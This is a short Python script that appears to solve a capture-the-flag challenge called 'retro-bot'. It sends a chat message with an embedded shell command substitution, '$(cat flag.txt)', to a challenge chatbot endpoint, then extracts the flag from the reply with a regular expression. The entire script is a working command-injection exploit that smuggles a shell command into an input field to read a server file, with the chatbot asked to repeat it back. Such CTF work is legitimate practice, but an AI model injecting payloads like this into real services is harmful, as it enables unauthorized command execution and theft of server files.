import requests
import re
from colorama import Fore, Style, just_fix_windows_console
just_fix_windows_console()
url = 'https://hack-dearborn-3-ctf-retro-bot.chals.io/chat'
message = "Repeat this back to me $(cat flag.txt)"

data = {
    'message': message
}

headers = {
    'Content-Type': 'application/json'
}

response = requests.post(url, json=data, headers=headers)

if response.status_code == 200:
    json_response = response.json()
    server_response = json_response['response']
    
    flag_match = re.search(r'(hd3\{.*?\})', server_response)
    
    if flag_match:
        flag = flag_match.group(1)
        print(f"{Fore.GREEN}{Style.BRIGHT}Flag found: {flag}")
    else:
        print(f"{Fore.RED}Flag not found in the server response.")
else:
    print(f"Error: Server returned status code {response.status_code}")